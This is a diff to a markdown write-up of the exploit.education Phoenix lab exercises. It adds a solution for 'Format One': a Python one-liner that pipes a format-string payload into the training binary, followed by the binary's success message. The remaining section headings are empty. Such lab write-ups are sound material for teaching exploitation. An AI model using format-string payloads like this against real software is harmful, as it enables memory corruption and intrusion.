@@ -28,7 +28,18 @@ Well done, the 'changeme' variable has been changed!
 ```
 
 ## Format One
+
+```bash
+$ python -c "print '%32x\x6c\x4f\x76\x45'" | ./format-one 
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Well done, the 'changeme' variable has been changed correctly!
+
+```
+
 ## Format Two
+
+
+
 ## Format Three
 ## Format Four
 ## Heap Zero
